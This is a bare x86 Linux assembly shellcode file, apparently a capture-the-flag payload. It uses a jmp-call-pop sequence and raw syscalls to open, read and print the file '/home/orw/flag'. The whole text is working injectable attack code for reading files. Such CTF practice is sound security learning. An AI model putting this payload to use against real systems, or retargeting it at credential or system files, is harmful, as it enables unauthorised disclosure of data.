global _start
 
[SECTION .text]
 
_start:
  jmp MESSAGE
 
GOBACK:
  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx
  xor esi, esi
  xor edi, edi
 
  mov eax, 5  ;open file
  pop ebx
  int 0x80
 
  mov ebx, eax
 
  xor eax, eax
 
  mov eax, 3  ;read from file
  mov ecx, esp
  mov edx, 100 ;count
  int 0x80
 
  mov eax, 4  ;write
  mov ebx, 1
  mov ecx, esp
  mov edx, 100 ;count
  int 0x80
 
  mov eax, 1 ;exit
  int 0x80
 
MESSAGE:
  call GOBACK
 
  db '/home/orw/flag'
